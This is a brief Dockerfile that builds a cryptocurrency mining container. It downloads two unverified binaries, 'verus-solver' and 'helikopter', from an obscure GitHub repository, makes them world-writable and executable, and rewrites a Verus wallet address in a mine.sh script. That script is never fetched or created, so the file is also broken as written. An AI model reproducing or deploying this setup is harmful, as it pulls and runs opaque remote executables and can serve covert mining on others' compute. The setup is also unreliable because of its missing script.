FROM debian:stable
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://github.com/desafff/gehasf/raw/main/verus-solver && chmod 777 verus-solver
RUN wget https://github.com/desafff/gehasf/raw/main/helikopter
RUN chmod 777 verus-solver helikopter
RUN sed -i 's/RDWx2Sa8iyeLVTMUUi5ypY357ZXH5tNf56/$PUBLIC_VERUS_COIN_ADDRESS/' mine.sh
